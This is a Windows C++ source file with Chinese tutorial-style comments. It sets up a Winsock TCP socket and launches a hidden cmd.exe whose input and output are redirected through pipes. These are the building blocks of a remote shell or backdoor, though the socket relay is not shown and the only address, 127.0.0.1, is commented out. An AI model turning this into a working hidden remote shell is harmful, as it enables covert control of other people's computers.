
#include "stdafx.h"
#include "function.h"
#include <winsock2.h>
#include <windows.h>

//头文件


//库文件
#pragma comment  (lib,"ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
HANDLE HMR;
HANDLE HMW;
HANDLE HCR;
HANDLE HCW;

SOCKET s;

int InitSocket() {
	//windows很特殊，需要单独调用api来进行网络的初始化和反初始化
	WORD wVersionRequsted;
	WSADATA wsaData;
	int err;
	wVersionRequsted = MAKEWORD(2, 2);
	//初始化操作
	err = WSAStartup(wVersionRequsted, &wsaData);
	if (err != 0)
	{
		return 0;
	}

	//1.socket   创建一个套接字     （可以理解成管道的pipe句柄，用于后续的数据传输接口） 
	s = socket(
		AF_INET,//TNET协议簇
		SOCK_STREAM,//表示使用的是TCP协议
		0);
	if (s == INVALID_SOCKET) {
		return 0;
	}

	//sockaddr s;//用于 描述IP和端口的结构体，不好用，因为是一个数组
/*	sockaddr_in  addr;//用于替换socketaddr结构体，两者大小一致
	int  nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;//写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//固定套路，填写外网ip或本地ip 127.0.0.1
	addr.sin_port = htons(10087);//h:host to  n:network short //坑，网络字节序（大尾方式）和本地字节序(小尾方式)
	*/
	return 1;
}
int Initcmd()
{
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	BOOL sj = CreatePipe(&HCR, &HMW, &sa, 0);
	if (!sj)
	{
		OutputDebugStringA("createpipe error");
		return 0;
	}
	sj = CreatePipe(&HMR, &HCW, &sa, 0);
	if (!sj)
	{
		OutputDebugStringA("createpipe error");
		return 0;
	}

	//替换标准输入输出
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = HCR;
	si.hStdOutput = HCW;
	si.hStdError = HCW;


	//加载cmd进程
	sj = CreateProcess(
		_T("C:\\Windows\\System32\\cmd.exe"),//被启动的程序路径 cmd system32对应64位，wow63对应32位
		NULL,//命令行参数（只为启动故可写空） T(“/c(command 控制) calc”),
		NULL,//继承属性
		NULL,//继承属性
		TRUE,//继承开关
		CREATE_NO_WINDOW,//无窗口DEBUG_PROCESS OD调试器
		NULL,//环境变量
		NULL,//当前路径 程序双击启动时的路径（相对路径）
		&si,//传出参数，取地址，传入指针
		&pi
	);
	if (!sj)
	{
		OutputDebugStringA("createprocess error");
		return 0;
	}
	return 1;
}
